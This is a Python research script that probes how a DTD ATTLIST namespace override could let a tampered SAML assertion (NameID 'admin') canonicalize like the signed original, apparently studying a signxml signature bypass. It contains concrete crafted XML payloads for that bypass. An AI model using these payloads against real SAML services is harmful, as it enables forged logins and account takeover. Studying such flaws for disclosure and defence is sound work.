"""Test the EXACT mechanism of the DTD ATTLIST attack on signxml."""
from lxml import etree

# Question: does DTD ATTLIST override EXPLICIT xmlns:saml on an element?

# Case A: explicit xmlns:saml on child, DTD provides different value
print("=== Case A: explicit xmlns:saml on child ===")
xml_a = (
    b'<!DOCTYPE x ['
    b'<!ATTLIST saml:Assertion xmlns:saml CDATA "urn:correct">'
    b']>'
    b'<x xmlns:saml="urn:wrong">'
    b'<saml:Assertion xmlns:saml="urn:wrong">test</saml:Assertion>'
    b'</x>'
)
try:
    tree_a = etree.fromstring(xml_a)
    child_a = tree_a[0]
    print(f"  tag: {child_a.tag}")
    print(f"  nsmap: {child_a.nsmap}")
except Exception as e:
    print(f"  ERROR: {e}")

# Case B: NO explicit xmlns:saml on child (inherits from parent)
print("\n=== Case B: inherited xmlns:saml on child ===")
xml_b = (
    b'<!DOCTYPE x ['
    b'<!ATTLIST saml:Assertion xmlns:saml CDATA "urn:correct">'
    b']>'
    b'<x xmlns:saml="urn:wrong">'
    b'<saml:Assertion>test</saml:Assertion>'
    b'</x>'
)
tree_b = etree.fromstring(xml_b)
child_b = tree_b[0]
print(f"  tag: {child_b.tag}")
print(f"  nsmap: {child_b.nsmap}")

# Case C: The ACTUAL attack scenario
# Signed XML has xmlns:saml="assertion" on assertion
# After byte replace: xmlns:saml="Assertion" (uppercase)
# DTD ATTLIST has xmlns:saml="assertion" (correct)
print("\n=== Case C: ACTUAL attack scenario ===")
xml_c = (
    b'<!DOCTYPE Response ['
    b'<!ATTLIST saml:Assertion xmlns:saml CDATA '
    b'"urn:oasis:names:tc:SAML:2.0:assertion">'
    b']>'
    b'<Response xmlns:saml="urn:oasis:names:tc:SAML:2.0:Assertion">'
    b'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:Assertion" '
    b'Version="2.0">'
    b'<saml:NameID>test</saml:NameID>'
    b'</saml:Assertion>'
    b'</Response>'
)
tree_c = etree.fromstring(xml_c)
assertion_c = tree_c[0]
print(f"  Assertion tag: {assertion_c.tag}")
print(f"  Assertion nsmap: {assertion_c.nsmap}")
nameid_c = assertion_c[0]
print(f"  NameID tag: {nameid_c.tag}")
print(f"  NameID nsmap: {nameid_c.nsmap}")

# Case D: Response has wrong NS, assertion has SAME wrong NS (inherited)
# No explicit xmlns on assertion element itself
print("\n=== Case D: Assertion inherits from Response (no explicit) ===")
xml_d = (
    b'<!DOCTYPE Response ['
    b'<!ATTLIST saml:Assertion xmlns:saml CDATA '
    b'"urn:oasis:names:tc:SAML:2.0:assertion">'
    b']>'
    b'<Response xmlns:saml="urn:oasis:names:tc:SAML:2.0:Assertion">'
    b'<saml:Assertion Version="2.0">'
    b'<saml:NameID>test</saml:NameID>'
    b'</saml:Assertion>'
    b'</Response>'
)
tree_d = etree.fromstring(xml_d)
assertion_d = tree_d[0]
print(f"  Assertion tag: {assertion_d.tag}")
print(f"  NameID tag: {assertion_d[0].tag}")

# c14n comparison
c14n_c = etree.tostring(assertion_c, method="c14n", exclusive=True)
c14n_d = etree.tostring(assertion_d, method="c14n", exclusive=True)
print(f"\n=== Exc-c14n comparison ===")
print(f"  Case C (explicit wrong): {c14n_c[:120]}")
print(f"  Case D (inherited wrong): {c14n_d[:120]}")

# The KEY test: does the original attack work because lxml
# removes the explicit xmlns:saml after DTD processing?
print("\n=== Case E: Simulating the actual signxml attack ===")
# Step 1: Create valid signed assertion bytes (simulated)
original_assertion = (
    b'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
    b'Version="2.0" ID="_test">'
    b'<saml:NameID>admin</saml:NameID>'
    b'</saml:Assertion>'
)

# Step 2: Replace NS (byte level)
tampered = original_assertion.replace(
    b'SAML:2.0:assertion',
    b'SAML:2.0:Assertion'
)
print(f"  Tampered assertion: {tampered[:100]}")

# Step 3: Wrap with DTD
attack = (
    b'<!DOCTYPE x ['
    b'<!ATTLIST saml:Assertion xmlns:saml CDATA "urn:oasis:names:tc:SAML:2.0:assertion">'
    b']>'
    + tampered
)

tree_e = etree.fromstring(attack)
print(f"  After DTD parse - tag: {tree_e.tag}")
print(f"  After DTD parse - nsmap: {tree_e.nsmap}")

# c14n
c14n_original = etree.tostring(etree.fromstring(original_assertion), method="c14n", exclusive=True)
c14n_attack = etree.tostring(tree_e, method="c14n", exclusive=True)
print(f"\n  c14n original:  {c14n_original}")
print(f"  c14n attack:    {c14n_attack}")
print(f"  c14n MATCH: {c14n_original == c14n_attack}")
